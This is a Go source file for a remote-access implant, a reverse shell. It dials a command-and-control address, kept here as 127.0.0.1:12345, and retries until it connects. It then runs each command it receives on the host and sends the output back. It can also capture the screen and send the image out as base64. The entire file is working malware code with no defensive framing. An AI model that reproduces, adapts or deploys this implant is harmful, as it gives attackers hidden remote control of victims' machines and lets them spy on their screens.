// Author : Nemuel Wainaina

package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"image/png"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

const (
	C2 string = "127.0.0.1:12345"
)

func main() {
	conn, _ := connect_home(C2)

	for {
		cmd, _ := bufio.NewReader(conn).ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		if cmd == "q" || cmd == "quit" || cmd == "exit" {
			send_msg(conn, "Connection closing :|")
			conn.Close()
			os.Exit(0)
		} else if cmd == "capturescr" {
			result := "img:" + capture_scr()
			send_msg(conn, result)
		} else {
			send_msg(conn, exec_cmd(cmd))
		}
	}
}

func connect_home(C2 string)  (net.Conn, error) {
	conn, err := net.Dial("tcp", C2)
	if err != nil {
		time.Sleep(15e9)
		return connect_home(C2)
	}
	return conn, nil
}

func send_msg(conn net.Conn, msg string) {
	fmt.Fprintf(conn, "%s\n", msg)
}

func exec_cmd(cmd string) string {
	result, err := exec.Command(cmd).Output()
	if err != nil {
		return err.Error()
	}
	return string(result)
}

func file_b64(file string) string {
	content, _ := os.ReadFile(file)
	return b64.StdEncoding.EncodeToString(content)
}

func capture_scr() string {
	bounds := screenshot.GetDisplayBounds(0)
	img, _ := screenshot.CaptureRect(bounds)
	file, _ := os.Create("scrshot.png")
	defer file.Close()
	png.Encode(file, img)
	scrshot := file_b64("scrshot.png")
	os.Remove("scrshot.png")
	fmt.Println(scrshot)
	return scrshot
}